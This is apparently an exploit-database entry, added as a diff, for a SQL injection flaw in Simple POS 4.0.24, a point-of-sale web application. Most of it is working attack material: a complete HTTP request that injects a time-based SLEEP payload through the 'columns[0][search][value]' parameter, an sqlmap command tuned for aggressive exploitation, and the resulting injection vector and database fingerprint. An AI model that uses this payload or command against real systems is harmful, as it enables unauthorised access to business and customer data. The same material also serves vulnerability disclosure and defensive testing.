@@ -1,0 +1,45 @@
+# Exploit Title: Simple POS 4.0.24 - 'columns[0][search][value]' SQL Injection
+# Google Dork: N/A 
+# Date: 2018-08-31
+# Exploit Author: Renos Nikolaou
+# Software Link: https://codecanyon.net/item/simple-pos-point-of-sale-made-easy/3947976
+# Vendor Homepage: https://tecdiary.com/
+# Version: 4.0.24
+# Tested on: Windows 10
+# CVE: N/A
+# Description : The vulnerability allows an attacker to inject sql commands on 'columns[0][search][value]' parameters in the management panel.
+
+# PoC:
+
+http://domain.com/spos/products
+
+POST /spos/products/get_products/1 HTTP/1.1
+Host: domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://domain.com/spos/products
+Content-Length: 2085
+Cookie: spos_spos_cookie=ab62f546025dd1a7d652ba75d13b87dc; spos_session=049soe8cr49aq318q7qhqlic6kpdgdee
+Connection: close
+
+draw=2&columns[0][data]=pid&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=true&columns[0][search][value]=') AND (SELECT * FROM (SELECT(SLEEP(15)))EcJf) AND ('tzYh'='tzYh&columns[0][search][regex]=false&columns[1][data]=image&columns[1][name]=&columns[1][searchable]=false&columns[1][orderable]=false&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=code&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=pname&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=type&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=cname&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=quantity&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=true&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=tax&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=true&columns[7][search][value]=&columns[7][search][regex]=false&columns[8][data]=tax_method&columns[8][name]=&columns[8][searchable]=true&columns[8][orderable]=true&columns[8][search][value]=&columns[8][search][regex]=false&columns[9][data]=cost&columns[9][name]=&columns[9][searchable]=false&columns[9][orderable]=true&columns[9][search][value]=&columns[9][search][regex]=false&columns[10][data]=price&columns[10][name]=&columns[10][searchable]=false&columns[10][orderable]=true&columns[10][search][value]=&columns[10][search][regex]=false&columns[11][data]=Actions&columns[11][name]=&columns[11][searchable]=false&columns[11][orderable]=false&columns[11][search][value]=&columns[11][search][regex]=false&order[0][column]=0&order[0][dir]=desc&start=0&length=-1&search[value]=&search[regex]=false&spos_token=ab62f546025dd1a7d652ba75d13b87dc
+
+
+# SQLMap Result:
+# SQLmap command: ./sqlmap.py  -r spos.txt --dbms=mysql -v4 -p 'columns[0][search][value]' --banner --level 5 --risk 3 --tamper=space2comment --random-agent
+
+Parameter: columns[0][search][value] (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: draw=2&columns[0][data]=pid&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=true&columns[0][search][value]=') AND (SELECT * FROM (SELECT(SLEEP(15)))EcJf) AND ('tzYh'='tzYh&columns[0][search][regex]=false&columns[1][data]=image&columns[1][name]=&columns[1][searchable]=false&columns[1][orderable]=false&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=code&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=pname&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=type&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=cname&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=quantity&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=true&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=tax&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=true&columns[7][search][value]=&columns[7][search][regex]=false&columns[8][data]=tax_method&columns[8][name]=&columns[8][searchable]=true&columns[8][orderable]=true&columns[8][search][value]=&columns[8][search][regex]=false&columns[9][data]=cost&columns[9][name]=&columns[9][searchable]=false&columns[9][orderable]=true&columns[9][search][value]=&columns[9][search][regex]=false&columns[10][data]=price&columns[10][name]=&columns[10][searchable]=false&columns[10][orderable]=true&columns[10][search][value]=&columns[10][search][regex]=false&columns[11][data]=Actions&columns[11][name]=&columns[11][searchable]=false&columns[11][orderable]=false&columns[11][search][value]=&columns[11][search][regex]=false&order[0][column]=0&order[0][dir]=desc&start=0&length=-1&search[value]=&search[regex]=false&spos_token=ab62f546025dd1a7d652ba75d13b87dc
+
+Vector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+web server operating system: Windows
+web application technology: PHP 7.1.16, Apache 2.4.33
+back-end DBMS: MySQL >= 5.0.12
+banner:    '10.1.31-MariaDB'
